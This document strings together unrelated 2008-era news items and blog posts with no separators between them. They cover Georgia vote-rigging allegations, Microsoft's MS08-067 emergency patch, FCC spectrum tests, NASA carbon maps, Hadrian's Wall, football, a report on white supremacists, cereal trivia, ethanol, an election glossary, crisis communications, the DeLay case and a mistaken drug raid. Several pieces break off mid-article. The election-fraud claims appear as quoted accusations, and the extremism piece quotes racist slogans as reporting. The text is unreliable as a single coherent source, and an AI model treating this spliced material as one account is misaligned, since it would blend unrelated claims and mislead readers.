As the state of Georgia prepares to conduct a runoff between incumbent Senator Saxby Chambliss and his Democratic challenger , Jim Martin , old doubts about the election in which Chambliss took the Senate seat from Max Cleland six years ago are attracting fresh notice .
Chambliss was the victor in the 2002 election by seven percentage points , despite polls which showed him trailing by five points just a week earlier .
That unexpected turnaround , combined with the exclusive control over the voting machines by Diebold Election Systems , raised suspicions of electronic vote - tampering from the start .
According to cyber - security expert Stephen Spoonamore , " If you look at the case of Saxby Chambliss , that 's ridiculous .
The man was not elected .
He lost that election by five points .
Max Cleland won .
They flipped the votes , clear as day . "
Spoonamore has been speaking out since last summer about the problems with the 2002 election , drawing on his examination of a software patch which the president of Diebold 's election unit personally brought to Georgia to be installed prior to the voting .
Spoonamore received the patch from Diebold whistleblower Chris Hood , who first came forward two years ago and spoke with Robert F. Kennedy , Jr. for an article in Rolling Stone .
" We ran the election , " Hood told Kennedy .
" We had 356 people that Diebold brought into the state .
Diebold opened and closed the polls and tabulated the votes .
Diebold convinced [ Georgia Secretary of State Cathy ]
Cox that it would be best if the company ran everything due to the time constraints , and in the interest of a trouble - free election , she let us do it . "
Hood has now repeated his doubts about the 2002 Georgia election , as well as about voting problems in Maryland in 2004 , in an interview with former ABC News producer Rebecca Abrahams .
" I have come to believe that these errors are now permanently embedded into the system , " Hood told Abrahams .
Abrahams states , " Jim Martin should be concerned about the veracity and validity of the November election results after anomalies in the last election and the statement by Chris Hood .
In fact , voters should demand to know if Chambliss had any knowledge that the 2002 election was rigged and whether he knew that Georgia citizens voted on electronic voting machines that had been patched with uncertified software days before the election in clear violation of Georgia law . "
Chambliss , meanwhile , may be growing testy as the runoff election approaches .
He was recently asked about his refusal to testify in a case involving Imperial Sugar and responded by putting his hand over the camera lens and saying , " You can take it away now . "

Microsoft to Issue Emergency Security Update Today
Microsoft said late Wednesday that it plans to break out of its monthly patch cycle to issue a security update today for a critical vulnerability in all supported versions of Windows .
Redmond rarely releases security patches outside of Patch Tuesday , the second Tuesday of each month .
The software giant is n't providing many details yet , but the few times it has departed from its Patch Tuesday cycle it has always done so to stop the bleeding on a serious security hole that criminals were using to break into Windows PCs on a large scale .
By Security Fix 's count , this would be the fourth time since January 2006 that Microsoft has deviated from its monthly patch cycle to plug security holes .
As shown by the stories in the linked examples above , Microsoft has fixed problems , each time , that were being actively exploited by bad guys to break into PCs .
Microsoft 's advanced notification bulletin says the problem is critical on Windows 2000 , Windows XP and Windows Server 2003 , meaning this is a vulnerability that can be exploited through little or no help from the user .
Redmond 's labels the flaw " important " on Windows Vista and Windows Server 2008 machines .
Microsoft is expected to push out the update around 1:00 p.m. ET .
The company also will reveal more details about the patch in a special Webcast .
I 'll have more information on this update as soon as the patch is out and details are released .
Stay tuned .
Update , 12:00 p.m. : Corrected the time Microsoft is expected to release this patch today .
Update , 12:45 p.m. ET : A source of mine received some information from Microsoft saying the vulnerability stems from a critical , wormable problem in the Windows server message block service , a component of Windows used to provide shared access to files , printers , and other communications over a network .
My source , who asked not to be identified because Microsoft has not yet publicly discussed the details , said Redmond has acknowledged that criminals have for the past three weeks been using the vulnerability to conduct targeted attacks .
The source said that so far , fewer than 100 targeted attacks leveraging this flaw have been spotted by Microsoft 's security team , but that Microsoft was rushing out this patch because the number of attacks appears to be increasing of late .
Update , 1:31 p.m. : Microsoft has released the update , MS08 - 067 , which will soon hit Windows update as well .
My source told me this was an SMB flaw , but he was only partly right .
The vulnerability lies with the Windows Server service , and more specifically with Microsoft 's implementation of " remote procedure call " ( RPC ) , a communications technology deeply embedded in the Windows operating system that allows a program to execute another process on a remote system .
RPC vulnerabilities are extremely dangerous , as they can be used by a computer worm to spread malicious software to machines on a network with lightning speed .
The infamous " Blaster worm " that attacked Microsoft and infected millions of Windows PCs in Aug. 2003 is probably the most recognizable example of malware exploiting an RPC flaw .
Microsoft does not release these so - called " out - of - band " updates lightly .
I would highly recommend applying this patch as soon as possible , either by visiting Windows Update or enabling Automatic Updates .
A quick scan with Windows Update on my Vista system offered the patch , which installed without incident ( requires a reboot ) .
Mobile devices using a new U.S. radio band with free wireless service would not cause significant interference with cell phones using a nearby band , the Federal Communications Commission has concluded from tests conducted last month .
The FCC is considering auctioning off frequencies in a band between 2155 and 2175 MHz to operators that would be required to offer free wireless data services in that band .
The agency tested use of this proposed AWS - 3 ( Advanced Wireless Services 3 ) band because holders of nearby AWS - 1 spectrum argued that it would interfere with their customers ' devices .
In a report released Friday , the agency concluded , " the analysis shows that an AWS - 1 and AWS - 3 device operating in close proximity does not necessarily result in interference . "
In addition , the FCC said its analysis was based on very bad conditions , so in more likely situations , the potential for interference would be less .
For example , the analysis assumed an AWS - 3 handset would always transmit at its maximum power , and that it would be operating close by to an AWS - 1 handset and on a directly adjacent channel .
The 2155 - 2175 MHz band was once used for microwave links between carrier facilities but was set aside for AWS in 2000 .
In 2006 , citing the lack of any FCC plan at the time for assigning the spectrum , M2Z Networks proposed using it for a combination of free and paid wireless services that would reach 95 percent of U.S. residents .
The startup proposed paying the government 5 percent of its gross revenue rather than going through a traditional license auction .
Last year , the government rejected M2 Z 's plan , but FCC Chairman Kevin Martin is now circulating a proposal among the commissioners that would set rules for an auction of the spectrum .
The agency had hoped to vote on the plan June 12 but delayed the vote due to objections from wireless operators .
T - Mobile , for one , had said its own tests showed mobile use of the band would degrade its customers ' experience .
The tests cited by the FCC 's report were conducted Sept. 3 - 5 in Seattle in the presence of engineers from T - Mobile , M2Z , AT&T , Nokia and other entities .
The results will be used as one part of the public record on the proposal , FCC spokesman Robert Kenny said in an e-mail interview .
If the commissioners support an auction , they will then have to set rules , possibly allowing additional time for public comment , Kenny said .
An auction could take place in June or July of 2009 at the earliest , he said .
However , the September tests do not appear to have resolved the dispute .
T- Mobile took issue with Friday 's FCC report , saying the agency based its conclusions on new assumptions that were n't used when the tests took place .
The carrier wants to give comments before a formal auction plan goes before the commissioners .
" We do n't think it 's unreasonable , given that they took five weeks to make their conclusions public , to ask for 30 days to respond to those conclusions , " said Kathleen Ham , T - Mobile USA 's vice president of federal regulatory affairs .
M2Z , not surprisingly , praised the report and called for quick action to make the band available .
" There is no longer any need for American consumers , the public interest and the FCC 's regulatory process to be held hostage as it has been for the last five months by incumbent carriers ... who have used unfounded claims of interference to disguise their intent to prevent the introduction of new broadband competition in the AWS - 3 band , " M2Z said in a statement .

NASA and a pair of California universities have published the first global satellite maps of the key greenhouse gas carbon dioxide in Earth ’s mid-troposphere , an area about five miles above Earth .
[ social_buttons ]
An article posted at NASA.gov says :
A research team led by Moustafa Chahine of NASA ’s Jet Propulsion Laboratory , Pasadena , Calif. , found the distribution of carbon dioxide in the mid-troposphere is strongly influenced by major surface sources of carbon dioxide and by large - scale atmospheric circulation patterns , such as the jet streams and weather systems in Earth ’s mid-latitudes .
Patterns of carbon dioxide distribution were also found to differ significantly between the northern hemisphere , with its many land masses , and the southern hemisphere , which is largely covered by ocean .
Now , forgive me if my view is skewed of late by emotion related to all things super - important - turned - ridiculous — extreme polarization over the environment , politics , economics — but I see something like this that NASA has provided , and I feel two quick reactions :
1. Great .
More valuable information with which to improve our future .
2. Shit .
More valuable information that half of this American society will immediately , mindlessly dismiss as only being part of a hoax , a conspiracy , another wacky idea from those horrible liberal wackos .
That is what everything seems to have spiralled down to for me , since the economy and politicking — and , seemingly , humanity — has found a bottomless pit of hell .
Is it just me ?
Or are we absurdly divided on everything these days ?
Are we , as a result , paralyzing ourselves as an American society , and as a global society ?
Are we just solidifying our angry oppositions to one another , disregarding sense — and science — to the extreme , all for the sake of ….of …. what ?
I ca n’t even guess why someone would vow that science is so flat wrong about climate change , especially when those same naysayers — we ’ll use Sarah Palin for an example , albeit one completely devoid of credibility — use science ( “ It ’s the weather patterns . ” ) to dispute NASA ’s proof that CO2 emissions have something to do with humans , particularly American humans .
And yes , I realize that the NASA information does not actually point fingers at humans .
But if you read the article / press release put out by NASA , it does n’t take much thought to connect the dots .
If CO2 largely originates on surfaces at middle latitudes , such as the U.S. and Europe , it ’s not hard to figure out we just might be playing a significant role in that .
Of course , those who want to first identify me — or anyone — as a liberal , are likely to ignore all facts and thought and just go for the jugular .
That ’s what we do nowadays .
That ’s what our leaders teach us to do .
And we elect those leaders to set our examples and guide our society .
Whatever happened to community , commonality , efforts of all contributing for the good of society ?
Maybe those washed down the outhouse pit with our collective prosperity , moral priorities , hope , common sense , human decency and general sanity .
Aerial pictures revealed previously unrecorded historical sites
Archaeologists have uncovered 2,700 previously unrecorded historic features along the length of Hadrian 's Wall by studying thousands of aerial pictures .
The English Heritage experts found ancient burial mounds , medieval sheep farms and 19th Century lead mines .
They were working from more than 30,500 pictures taken during the past 60 years as part of a push to map and interpret archaeological sites across England .
Hadrian 's Wall , in northern England , is a World Heritage Site .
The English Heritage project to map the Roman frontier began in 2002 and covered a wide area on either side of the 73 mile ( 117 km ) length of the wall , from the Solway Plain in Cumbria to Newcastle in the east .
Features catalogued include an Iron Age hillfort near the village of Fourstones , Northumberland , the deserted medieval village of East Matfen , Tyne and Wear , and a World War II anti-aircraft gun battery near Cleadon , Tyneside .
David MacLeod , of English Heritage 's Aerial Survey and Investigation team , said : " We need to remember that Hadrian 's Wall is not an isolated monument set within a landscape devoid of any other history .
" This region saw a tremendous amount of activity before the Romans arrived and after they left , traces and memories of which remain today . "
He added : " It will help us to understand and manage the rich heritage of human activity that has shaped this landscape , whether it is the remains of a Bronze Age farm or a 20th Century gun battery . "
Breathe in … exhale … breathe in … exhale …
Now , un - clinch your wringing hands , clap in time , and say it with me : “ We love you Arsenal , we do .
We love you Arsenal , we do .
We love you Arsenal , we do , ohhh Arsenal we love you ! ”
Repeat until you stop worrying about the season ahead .
I love Arsenal and I do trust Arsene Wenger .
Maybe I can have this faith because I never played Football Manager , I do n’t play Dungeons and Dragons for football fans ( fantasy football ) , and I do n’t play any sports on my computers .
Those games are * ahem * simulations , folks .
In real life , Arsene Wenger is arguably the most successful manager Arsenal have ever had .
Moreover , there ’s this voyeuristic quality to Arsenal fans right now .
We look at what every other team is doing and want to compare ourselves to them .
That ’s unhealthy and only invites a fat tick like Usmanov to jump on board , satisfy your desire to be like Chelsea for a few years while slowly draining the blood from the team .
And to what end ?
Chelsea have spent something like £ 800 m in order to win 3 real trophies .
Last season , in fact , they won exactly the same number of trophies that Arsenal won : ZERO .
They have the highest wage bill of any team in the world , they pay ridiculous transfer fees to get players in , they sit those players on the bench to rot , they take huge losses when re-selling , and they have the world ’s most classless fans .
Is that the kind of team you really want to support ?
It ’s telling that Jose Mourinho was so desperate for kudos that he counted Milk Cups and Charity Shields when he held up his infamous “ 6 finger salute ” to Roman Abramovich .
He had to , everyone , everywhere knows that £ 800 m Milk Cups do n’t make you a big club .
It ’s a truly sad day when you have the likes of John Terry and Frank Lampard beating up teenagers and taking their Milk money then celebrating as if they had just won the Champions League .
Honestly , why should n’t they celebrate like that ?
They ’ll never win the Champions League , so I guess , like Tottenham , the best they can manage is to win a 5 game tournament against 3rd division teams and Arsenal ’s youth team .
No , Chelsea will always be the second best club in London .
Same too with Manchester City .
They can buy all the Robinho ’s in the world , they will always be the second best team in Manchester .
Their new owner is so out of touch he believes that they will be in the Champions League next season .
How ?
By finishing 4th ?
No. Fucking .
Way .
They have a better shot at winning the FA Cup than finishing 4th .
But of course he thinks that , what does he know about football ?
He ’s an oil guy , a guy who buys property , and Manchester City is now one of his properties .
A toy for him to play around with .
Tellingly , Al - Fahim has said “ I ’m the new Abramovich ” which means “ I ’m here to meddle in this thing you all call ‘ football ’ and see if I ca n’t buy myself a Champions League trophy . ”
Well , like Abramovich he ’s got a harsh lesson coming ; you can not buy respect or success .
Finally , who cares if Bobblekopf went to Man U ?
It ’s another £ 30 m that the club cannot afford , that they had to spend to keep their prawn sandwich fans with their unrealistic expectations in line , and that Tottenham will probably never see .
The player himself is a tremendous talent but a horrible teammate .
I ca n’t wait to see him dress down Ronaldo .
Oh , it will happen , mark my words .
No , I ’d rather have Arsene Wenger and Arsenal FC .
The only thing I have to overcome to fully support this team is my own ego .
My ego tells me that I might know better than Arsene and thus second guess why he did n’t land Alonso .
My ego tells me that I know better than he does when it comes to Eboue , Vela , Nasri , or any others on the team .
It ’s my ego , and I suggest , your ego that needs to be put to bed .
This is the team we have , this is the manager we have , these are the owners we have , and you are the fans .
Get behind the team or go support Chelsea : London ’s second best football team .
“ We love you Arsenal , we do … ”
P.S. Kevin Keegan has reportedly tucked tail between his legs and ducked out of the Newcastle spotlight for the second time .
I believe I called it two days ago : relegation is looming now for Newcastle .

The prospect of an African American president is bringing the nation ’s white supremacists out of the shadows — and , along with them , some subtler versions of racialist populism .
Both hearken back to another economically and socially turbulent time in the United States , in the early 1980s .
Daniel Cowart ( above ) and Paul Schlesselman , the two neo -Nazis arrested for plotting to kill 102 African American high school students and then embark on a killing spree that would end with the assassination of Barack Obama , clearly drew inspiration from a criminal white nationalist group called The Order .
In the early 1980s , members of The Order carried out a series of crimes that included robbery , counterfeiting , and a high - profile murder in order to advance their plans to found a white homeland .
The connection to The Order is evident in the numbers the two men had scrawled on their car : 14 and 88 .
The so - called Fourteen Words is a slogan —
” We must secure the existence of our people and a future for white children ” — coined by Order member David Lane , who also authored an article called The 88 Precepts .
In white supremacist circles , 14 - 88 is a shorthand expression of allegiance to the beliefs put forth by Lane and The Order .
Their aim was to establish a whites - only nation in the Pacific Northwest , where they could preserve the Aryan race from being polluted by nonwhites and enslaved by what they called the Zionist Occupied Government of the United States .
( Lane also advocated polygamy and a kind of European paganism he called “ Wotanism . ” )
The plot hatched by Cowart and Schlesselman seems to have posed little real threat to Obama :
Their plans to
“ dress in all white tuxedos ” and top hats and “ drive their vehicle as fast as they could toward Obama shooting at him from the windows ” is as unlikely as it is grotesque .
Considering the nation ’s history of deadly school shootings , however , the skinheads ’ plan to rob a gun store and then shoot 88 students and behead 14 more at a predominantly black high school is ( with the possible exception of the beheadings ) frighteningly plausible .
A look at Cowart and Schlesselman ’s model is sobering as well .
For two years , from 1983 to 1985 , The Order — also known as the Brüder Schweigen or Silent Brotherhood — was active , violent , and deadly .
In order to finance their mission , the gang robbed a series of banks and armored cars and ran a counterfeiting operation , and was best known for the 1984 murder of Denver talk - show host Alan Berg .
The group ’s founder , Robert Jay Mathews , modeled himself after the main character in National Alliance leader William Pierce ’s The Turner Diaries .
Mathews was killed in a fiery shootout with federal agents in 1984 , while David Lane was arrested in 1985 and died in prison last year while serving a 190 - year sentence .
Both have become heroes and martyrs to the white supremacist movement .
During the heyday of the racist far right in the 1980s , The Order was only one of the groups active across the United States .
( I reported on that subculture for years , and produced a book and a film about it . )
But those who track the white power movement generally view it as in decline after the 1980s — swallowed up in part by the onset of Christian fundamentalism , muffled by the anti-government policies of conservative Republicans , and floundering around without clear purpose or leadership .
Yet remnants of it have clearly survived .
They surfaced with horrific results in Oklahoma City in 1995 , after Timothy McVeigh also found inspiration in The Turner Diaries and The Order .
And they can be found among today ’s skinheads and their fellow travelers .
Some of these are part of biker gangs — including the Sons of Silence , who were implicated in a threat against Obama at the Democratic convention in Denver .
Some have joined the anti-immigrant vigilante movement , committing drive - by shootings of Mexican laborers .
Others are scattered around doing their own thing , picking fights in bars , beating up gay men or random African Americans .
According to one report , their numbers in the US military have grown as recruitment efforts become more desperate .
Wherever they exist , white supremacists are clearly coming out of their dark corners in response to Obama ’s presidential campaign .
Both federal law enforcement officials and independent organizations that monitor hate groups are reporting increased traffic on the Internet , and even a kind of twisted optimism that Obama ’s election will produce a “ backlash ” and lead to the white uprising they ’ve dreamt about .
In June , David Duke wrote , “ Obama will be no worse for us than any of the White sell - outs that came before him .
But , Obama will be a clear signal for millions of our people .
Obama is a visual aid for White Americans who just do n’t get it yet that we have lost control of our country , and unless we get it back we are heading for complete annihilation as a people …
Obama is the wake up call . ”
I ’ve heard similar statements this month while traveling across the country with a crew from Guardian Films .
In Missouri , we interviewed Steven Boswell , member of the National Socialist Movement , who says he is “ hearing things coming out of people ’s mouths now ” that he never heard a few years ago , like “ that there ’s gonna be a race war coming up , and we better be ready for it . ”
He predicts that “ as the economy continues to get worse , as our country continues to be overrun by Mexicans , as Obama gets elected and takes office , there will be opportunities that we have to be ready for and have to capitalize on . ”
This is all sadly consistent with the long history of American Nativism , in which periods of social insecurity and economic despair have yielded increased racism , anti-Semitism , and xenophobia , together with a populist distrust of national government .
It was during the farm crisis of the 1980s , amidst an epidemic of foreclosures , that I last heard rural Midwesterners describe elaborate conspiracies in which Jewish bankers — who sometimes had ties to international communism , as well as to the black and brown people who served as their frontline troops — had already taken over the US government , and would soon arrive to deprive “ sovereign ” white men of their land , their rights , their freedom .
Twenty - five years later , I ’m hearing thinly encoded messages that suggest that this kind of thinking still prevails among some people here in the heartland — perhaps gaining new fuel from the apocalyptic financial meltdown .
In Missouri last week , as we filmed a story on ethanol , a plant manager shared with the Guardian ‘s correspondent his belief that Obama is not only a Muslim , but also hinted that he may be the anti-Christ whose coming was predicted by the Book of Revelation .
Such beliefs seem to be once again finding purchase among people who would never sport a swastika tattoo or identify as white supremacists , but rather think of themselves as hardworking , patriotic Christians who have been double - crossed by the system .
When the despair runs deep enough , and finds no other outlet , it can veer into the kind of racialist , paranoid populism that is both more understated and more widespread — and thus more frightening — than the skinheads with their sawed - off shotguns and Nazi salutes .
Some portions of this piece originally appeared on Guardian Films Road to the White House blog .
Democratic Senator Barack Obama will take his place in the White House after a long and hard - fought campaign , defeating Republican rival John McCain to become the first black president of the United States .

I love Boo Berry cereal .
I do n’t know what it is exactly , but I just find that laid - back droopy eyed blue breakfast ghost and his delicious cereal so damn appealing .
So enamored am I that every Halloween I stock my cabinets full of the Monster Cereals ( usually 5 or 6 boxes ) and by December its all gone .
I eat it for snacks , breakfast .. anytime .
While having a bowl for dinner this evening I thought to myself “ I really like this cereal .
I should find out more about it . ”
So I got on the internet and compiled some fun fact I thought my fellow Monster Cereal fans might enjoy .
The five flavors of Monster Cereal
Count Chocula = Frosted Chocolate flavored cereal with marshmallows .
Franken Berry = Frosted Strawberry flavored cereal with marshmallows .
Boo Berry = Frosted Blue Berry flavored cereal with marshmallows .
Fruit Brute = Frosted Fruit flavored cereal with lime flavored marshmallows .
Yummy Mummy = Frosted Fruit flavored cereal with vanilla flavored marshmallows .
Monster Cereal Fun Facts
Franken Berry and Count Chocula were introduced by General Mills in 1971 , Boo Berry came along 2 years later and in 1974 Fruit Brute was released .
Fruit Brute was first Monster Cereal to be discontinued .
They stopped making it in 1983 .
In 1987 , General Mills came up with a new fruity cereal and created a brand new spokesmonster , Yummy Mummy .
His reign of fruity terror came to end in 1993 .
Technically GM never considered Yummy Mummy a part of the Monster Cereal line , but of course we know better .
Although Fruit Brute and Yummy Mummy cereals have never been revived ( as of the writing of this post ) their spokesmonster images still can be found on Monster Cereal merchandise .
A rarity in the cereal world .
Contrary to popular belief Franken Berry and Boo Berry have not been discontinued .
They are just not as popular as Count Chocula so they get a more sporadic nationwide release .
Best time to look for them ?
Halloween , of course .
Count Chocula was briefly discontinued to consumer conern over its sugar level .
It has since been re-released in a more “ healthy ” form .
It now has 9 less calories per cup .
The initial run of Franken Berry contained a dye that did not break down in the body and caused the consumers stool to come out a disturbing pink .
This phenomenon came to be called …wait for it … Franken Berry Stool .
A new dye was quickly implemented .
If Boo Berry sounds familiar it is because it is an actor imitating the famed actor Peter Lorre ( who bears a resemblence to Boo Berry ) .
The voice of Count Chocula is modeled after Bela Lugosi and had been voiced by the great Larry Kenney ( father of Reno 911 ’s Kerry Kenney - Silver ) .
Franken Berry ’s voice was modeled after Boris Karloff .
The Monster Cereal ads were created by the Dancer , Fitzgerald and Sample ad agency .
Count Chocula ’s original catchphrase was “ I vant to eat you cereal ” .
Of course one of the things that really sell the Monster Cereal is the awesome commercials .
Here are a few of my favorites :

What you are still here ?

I suggest you stop by and read the awesome Breakfast of the Gods Comic Series by Brendan Douglas Jones .

Congress Switchboard : 202-224-3121
" Rob Kall shows us that the high - tech information revolution set the stage for a political and social evolution , the connectivity of which has the capacity to transform everything , everywhere .
We have only to say ' yes ' to tap [ into ] the power of this interconnection , participating in it from where we stand . "
Dennis Kucinich , former U.S. Representative ( D - OH ) and 2004 and 2008 Democratic presidential primary candidate
One of the 2007 energy bill ’s most ambitious provisions  the ethanol mandate  has turned out to be its most troublesome .
The provision would boost ethanol production from 7 - plus billion gallons today to 36 billion gallons by 2022 .
In practical terms , this means doubling the production of corn ethanol until advanced forms of ethanol and other biofuels kick in .
Corn ethanol came under fire earlier this year when evidence mounted that the diversion of cropland from food to fuel had contributed to the spike in worldwide food prices .
What is less clear is whether corn ethanol is good or bad for the planet  whether it emits fewer or more greenhouse gas emissions than conventional gasoline .
The answer turns on how you measure emissions .
Congress stipulated that ethanol be cleaner than gasoline and handed the job of measuring emissions to the Environmental Protection Agency , which has found itself under ferocious pressure .
The ethanol industry wants its product shown in the best possible light .
Environmentalists want an honest accounting , which the public deserves but which they do not think an industry - friendly Bush administration is capable of .
The most contentious question involves the emissions caused by direct and indirect changes in land use associated with growing biofuels .
Until late last year , corn ethanol had been seen as at least carbon neutral  and thus much cleaner than gasoline  because the greenhouse gases it absorbed while growing canceled out the gases it emitted during combustion .
This made it a win - win fuel  even a win - win - win fuel  because it also encouraged the construction of ethanol refineries in the American heartland and eased , to some extent , America ’s dependence on imported oil .
( CNN ) -- Election night can be as confusing as it is exciting .
What 's the difference between electoral votes and popular votes ?
What 's a balance of power ?
Read through our glossary to learn more about these and other terms .
Balance of power :
The party with the most seats in each of the two houses of Congress -- the House of Representatives and Senate -- controls the leadership of that house .
The balance of power shows which party has the most seats , how many seats are up for election this year and how many each party has won on election night according to CNN projections .
Ballot measures : State authorities place a wide variety of questions on the ballot for voters to decide .
Although the questions vary widely , they often will determine the fate of proposed changes to state tax laws or changes to state constitutions .
Battleground state : A state where voter support is nearly equally divided between major party candidates and either candidate could win .
Blue state : Traditionally , a Democratic - controlled state or a state that has voted for the Democratic presidential candidate .
Electoral votes :
It takes 270 electoral votes to win the presidency .
Voters are deciding which presidential candidate gets each state 's electoral votes .
Most states are winner - take - all .
Each state 's electoral vote equals the number of senators and representatives and is allocated based on population .
Exit polls : On Election Day , news organizations and other groups dispatch pollsters to polling places .
Pollsters ask voters to reveal who they cast their ballots for and why .
Pollsters use this data to make early guesses about which candidates will win and to determine which groups of voters tended to support certain candidates .
GOP : Grand Old Party , nickname of the Republican Party .
House seats : Every two years , all 435 seats in the U.S. House of Representatives are up for election by popular vote in each member 's local voting district .
The number of House districts in each state is determined by the state 's population in the most recent U.S. census , which occurs every 10 years .
States with more citizens are allocated more representatives among the 435 House members .
The nation 's most populous state , California , has the most House members : 53 .
Six states with small populations each have just one House representative .
Each district 's geographic boundaries are determined by authorities in each state .
Percentage of precincts reporting : Each voting precinct must report its local results to a central authority before an official winner can be determined .
This number is displayed by county and state for president , Senate , governor and ballot measure contests , and by county and district for House races .
Popular vote :
The total number of votes cast for each candidate by all voters .
In 2000 , George W. Bush did not win the national popular vote , although he did win enough electoral votes to win the presidency .
Red state : Traditionally , a Republican - controlled state or a state that has voted for the Republican presidential candidate .
Senate seats : Each state has two Senate seats and Senate elections are staggered .
Every two years , one - third of all 100 Senate seats are up for election .
A Senate term is six years .

Someone recently pointed out to me that “ a crisis is the ultimate teachable moment . ”
Startup founders have long known this .
Whether you find yourself dealing with a sudden lack of access to commercial loans , the collapse of a funding round , a management change , or even a failed product , you can help yourself work through such unpredictable — yet probably inevitable — business challenges by being prepared in advance with a response plan .
One of the most important areas of your preparation , but one that is often overlooked , is your communications plan .
Maintaining clear and consistent communication with your staff , investors , customers and your partners can make all the difference to the success or failure of business in crisis , says Wendy Lane .
She is founder of the public relations and marketing firm Lane PR based in Portland , Ore .
Over the years Lane has helped clients , cope with all kinds of crises : from bankruptcies , to public political snafus , and in once case , a violent tragedy at a place of business .
( Believe me , this sort of crisis puts the stock market turmoil into perspective , fast ) .
The point is , a crisis is a crisis because it creates uncertainty .
You cannot predict exactly who you ’re going to need help from in a pinch – employees or lenders , or both ?
People you thought you could rely on will surprise you in positive and negative ways .
This is why keeping healthy lines of communication open with all of your constituencies is so important .
Naturally you should do this as a matter of course in your daily business , but in the end , says Lane , “ Good crisis communications is about transparency , transparency , transparency . ”
Lane ’s firm has a crisis management plan for its clients .
She offered to share it .
Here are some takeaways :
1. Identify risk areas of your business that could lead to an internal crisis , or be compounded by an external one .
You ’ve already done this with your business model , now think about how your risk area could be compounded by exposure to customers or the media .
Risk areas to consider : death or serious illness of a senior executive ; serious on - the - job injury ; technical challenges ; natural disaster ; security breach .
2. Create a crisis management team and have a senior executive it .
Appoint an internal communicator to support employee communication activities .
Select an external communicator , to deal with outside parties like media or retail customers .
( If you have one , this is your PR counsel . )
Deal with investors .
If you can not take it on , appoint another senior staffer to deal with partners .
Just make sure no constituency is getting communication from more than one person – consistency is important .
3. Develop a call list .
Sounds like a call tree , but do it .
You have no idea how much it will help you in a panic to have previously prioritized who among your senior staff , or your board , needs to be contacted , and in what order .
Contacts for every member of your crisis management team should also be on the call list .
4. Develop your message .
Do not do this in a vacuum .
Use your crisis management team to help you .
Any outside adviser you enlist for help ( a lawyer , etc. ) is now de facto part of your crisis communications team .
Choose carefully .
5. Notify your constituencies in a concerted effort .
Tell non executive - employees collectively about your crisis in order to dispel rumors and speculation .
Call a staff meeting , send a broadcast e-mail or voice mail .
Do not communicate piecemeal .
Be candid .
Deliver updates as information is available .
6 . Assume that any information you share with employees , partners , investors , etc. could be communicated to the media or outside parties .
Court wo n't revisit decision against DeLay associates
Court wo n't reconsider decision against DeLay 's former associates
Justice issues dissenting opinion criticizing panel for slow progress
AUSTIN — An Austin - based appeals court split along party lines in rejecting a call from one of its members for a full - court rehearing of a case involving Tom DeLay 's onetime political associates .
Third Court of Appeals Justice Diane Henson , a Democrat , unsuccessfully asked the six - member court to reconsider a decision , reached last month by a panel of three Republican justices , that DeLay 's attorney believes will eventually throw out the prosecution 's case against the former congressman .
DeLay was not a party to the appeal but faces the same money laundering and conspiracy charges as his associates , John Colyandro and James Ellis .
The panel refused to dismiss charges , finding that the state 's ban on corporate contributions is constitutional .
But it said that the money laundering statute in place at the time did not apply to checks .
DeLay and his associates are accused of funneling $ 190,000 in corporate donations illegally to seven Texas House candidates in 2002 .
Prosecutors allege they conspired to violate the corporate ban by laundering money through national Republican Party accounts .
Dick DeGuerin , DeLay 's attorney , said he believes that the ruling will force prosecutors to eventually dismiss the charges because the indictment alleges the transactions were conducted with checks .
The Legislature in 2005 added checks to the definition of " funds " in the money laundering law .
Request denied
The full court on Friday denied Henson 's request , with the four Republican members voting against a full hearing and Henson and Democrat Jan Patterson dissenting .
The rejection of Henson 's request for a rehearing could make it more likely that Travis County District Attorney Ronnie Earle will ask the full court to reconsider the ruling .
He still could appeal to the state 's highest criminal court , the Court of Criminal Appeals .
If the Third Court 's ruling stands , DeGuerin said he will ask the trial judge hearing the DeLay case to dismiss the indictments .
Henson issued a strongly worded dissenting opinion critical of the panel for its two - year delay between oral argument and the issuance of the opinion .
She said her colleagues overreached to decide an issue that was not properly before the court .
DeLay was indicted in 2005 and had to give up his leadership position as majority leader because of the indictments .
He resigned from Congress in 2006 and is working as a consultant in Washington .
Henson said the length of time it took the panel to decide the case shows that the appeal raises complex issues that should be reviewed by the entire court .
" In a case where the panel has been unable to resolve pretrial proceedings in this accelerated case in even a remotely reasonable period of time , effectively tying the hands of the prosecution for several years and delaying the resolution of charges of public corruption that undermine the very core of our political system , the need for en banc ( full court ) review is evident , " she wrote .

A roadside billboard sprung up in West Plains , Missouri , recently , featuring a caricature of Barack Obama wearing a turban along with the message " Barack ' Hussein ' Obama equals more abortions , same sex marriages , taxes , gun regulations . "
While some members of that community are shocked and disgusted - the Obama campaign dismissed it as " a distraction " - other locals are of the opinion that if you do n't like that sign you can drop dead .
The billboard is after the jump .
So is a video of McCain / Palin supporters at yet another rally in PA - one of them telling a really funny joke about sex assault victims who are forced to pay for their own rape kits .

Drugs police raid grandmother 's home ... after mistaking TOMATO plants for cannabis
As Lulu Matheson was warming herself by the fire at her remote rural cottage , police and sniffer dogs burst through the door .
The officers were sure that the house was a cannabis factory – and refused to accept that her pot plants were n’t . . . well , pot plants .
Despite protestations by the 79 - year - old widow that they were looking at her family ’s prized tomato crop , the officers insisted on sending samples of the plants to be analysed .
Mistaken identity : Lulu and Gus Matheson with their prized tomato plants
Mrs Matheson , who has lived in the cottage for 53 years , said : ‘ I got a terrible fright and I could n’t understand what they were doing here because I knew we had nothing more than tomatoes in the window .
I do n’t know what the neighbours must be thinking . ’
The high - profile police operation took place in the picturesque village of Shieldaig in the Highlands of Scotland a week ago .
Mrs Matheson ’s 47 - year - old son Gus , a former driver , was looking out of the window when he spotted police cars screeching to a halt .
He said : ‘ I wondered what on earth was going on .
I opened the door and they more or less barged past , saying that I was growing cannabis on the windowsills .
‘ I started laughing because I knew they were tomato plants but it was n’t so funny when they frisked me and then started tearing the house apart . ’
' A terrible carry - on ' : Even dogs , Zac , bottom , and Moby were put in police cars
Mr Matheson was kept under guard in the bedroom while officers searched the furniture and looked under the mattress .
He said that the police impounded the family ’s pet dogs .
‘ They even held Zac , our black labrador , and Moby , our Jack Russell , putting them in the back of one of the cop cars , ’ Mr Matheson added .
‘ And I just could n’t believe it when they brought sniffer dogs all the way from Alness , which is about two hours away .
‘ My 26 - year - old nephew Stephen – who hardly even smokes a cigarette , never mind cannabis – lives with his girlfriend in a caravan next door and they went over and searched there too , after handcuffing him .
It was a terrible carry - on . ’
News of the raid spread quickly across the Highland village of Shieldaig , above
He added : ‘ Despite leaving with their tails between their legs , the police did n’t even apologise . ’
As a keen gardener , Mr Matheson grows tomatoes in the south - facing bedroom window to catch the sun .
